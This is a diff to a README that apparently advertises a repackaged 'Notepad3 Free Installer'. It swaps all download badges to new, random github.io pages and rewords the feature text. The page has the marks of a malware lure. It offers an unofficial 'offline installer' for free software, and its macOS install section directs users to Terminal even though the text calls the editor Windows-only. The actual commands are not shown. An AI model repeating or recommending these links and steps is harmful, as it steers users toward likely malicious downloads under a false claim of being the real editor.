@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Text+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Notepad3 Free Installer** — Notepad3 is a free, fast source code editor for Windows based on the Scintilla editing component and the original Notepad2 project. Works without internet access, no account required. Full offline installation.
+**💻 Notepad3 Free Installer** — Notepad3 is a free, fast source code editor for Windows based on the Scintilla engine. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Notepad3](https://img.shields.io/badge/⬇_Install_Notepad3-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Notepad3](https://img.shields.io/badge/⬇_Install_Notepad3-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Notepad3
 
-Notepad3 is a free, fast source code editor for Windows based on the Scintilla editing component and the original Notepad2 project. Features syntax highlighting for dozens of languages, regular expression search, code folding, Unicode support, and a minimal interface that loads instantly. Notepad3 is designed as a direct replacement for Windows Notepad with significantly more power.
+Notepad3 is a free, fast source code editor for Windows based on the Scintilla engine. A drop-in Notepad replacement, it supports syntax highlighting, regular expression search, bracket matching, code folding, and encoding detection while staying lightweight.
 
 ---
 
 ## ❌ Problem: Notepad3 is hard to access
 
-- **Windows Only** — No macOS or Linux version
-- **Feature Scope** — More limited than full-featured editors like VS Code for complex projects
-- **Plugin Support** — No extension system for adding new functionality
-- **Collaboration** — No built-in real-time collaboration features
+- **Windows Only** — Not available on macOS or Linux
+- **Basic Feature Set** — Missing IDE features like Git integration, terminal, and extensions
+- **Configuration Limited** — Less customizable than editors with plugin ecosystems
+- **Minimal Scope** — Best used as an enhanced Notepad, not a full development environment
 
 ---
 
@@ -61,9 +61,9 @@ Notepad3 is a free, fast source code editor for Windows based on the Scintilla e
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Notepad3 is a free, fast source code editor for Windows based on the Scintilla e
 
 <div align="center">
 
-[![⬇ Install Notepad3](https://img.shields.io/badge/⬇_Install_Notepad3-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Notepad3](https://img.shields.io/badge/⬇_Install_Notepad3-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Notepad3 is a free, fast source code editor for Windows based on the Scintilla e
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Notepad3 is a free, fast source code editor for Windows based on the Scintilla e
 
 ---
 
-**Notepad3 Free Installer** — Notepad3 is a free, fast source code editor for Windows based on the Scintilla editing component and the original Notepad2 project. Install without internet connection today!
+**Notepad3 Free Installer** — Notepad3 is a free, fast source code editor for Windows based on the Scintilla engine. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Notepad3](https://img.shields.io/badge/⬇_Install_Notepad3-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Notepad3](https://img.shields.io/badge/⬇_Install_Notepad3-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
